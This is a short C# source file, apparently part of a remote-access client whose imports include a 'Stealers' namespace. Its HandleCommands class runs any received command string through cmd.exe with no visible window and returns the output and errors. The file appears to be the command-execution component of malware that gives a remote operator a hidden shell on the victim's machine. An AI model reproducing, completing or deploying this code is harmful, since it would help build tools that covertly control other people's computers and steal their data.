using System.Diagnostics;
using System.Text;
using Client.Conexion;
using Client.Stealers;
using Client.Util;



namespace Client.Commands
{
    static class HandleCommands
    {

        public static string ExecuteCommand(string command) {

            if (string.IsNullOrWhiteSpace(command))
                return "[ERROR] El comando está vacío.";

            try
            {
                var processInfo = new ProcessStartInfo
                {
                    FileName = "cmd.exe",
                    Arguments = "/c " + command,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8
                };

                using (var process = new Process { StartInfo = processInfo })
                {
                    process.Start();

                    string output = process.StandardOutput.ReadToEnd();
                    string error = process.StandardError.ReadToEnd();

                    process.WaitForExit();

                    if (!string.IsNullOrWhiteSpace(error))
                        output += $"\n[Error]\n{error}";

                    return output;
                }
            }
            catch (Exception ex)
            {
                return $"[EXCEPCIÓN] {ex.Message}";
            }
        }



    }
}

